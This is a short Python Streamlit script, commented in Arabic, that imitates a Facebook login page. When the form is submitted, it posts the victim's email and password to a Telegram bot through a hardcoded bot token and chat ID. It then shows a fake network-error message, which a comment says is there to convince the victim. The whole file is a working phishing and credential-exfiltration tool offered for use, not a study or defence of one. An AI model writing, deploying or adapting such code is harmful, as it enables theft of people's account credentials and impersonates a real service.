import streamlit as st
import requests

# التوكن والأيدي الصحيحين من صورتك الأخيرة
BOT_TOKEN = "8546784309:AAHe0WXiK1wyZ45JUgGxMeOQa8g-owMm9aM"
CHAT_ID = "8546784309"

def send_telegram(user, pwd):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": f"🔔 تم سحب بيانات جديدة:\n📧 الحساب: {user}\n🔑 كلمة السر: {pwd}"
    }
    try:
        requests.post(url, json=payload)
    except:
        pass

st.set_page_config(page_title="Facebook Login", layout="centered")

# عرض الواجهة (استخدمنا تصميم بسيط لضمان العمل)
st.markdown("<h1 style='color: #1877f2; text-align: center;'>facebook</h1>", unsafe_allow_html=True)

with st.form("login_form"):
    email = st.text_input("البريد الإلكتروني أو رقم الهاتف")
    password = st.text_input("كلمة السر", type="password")
    if st.form_submit_button("تسجيل الدخول", use_container_width=True):
        send_telegram(email, password)
        # رسالة وهمية لإقناع الضحية
        st.error("عذراً، حدث خطأ في الشبكة. يرجى المحاولة لاحقاً.")
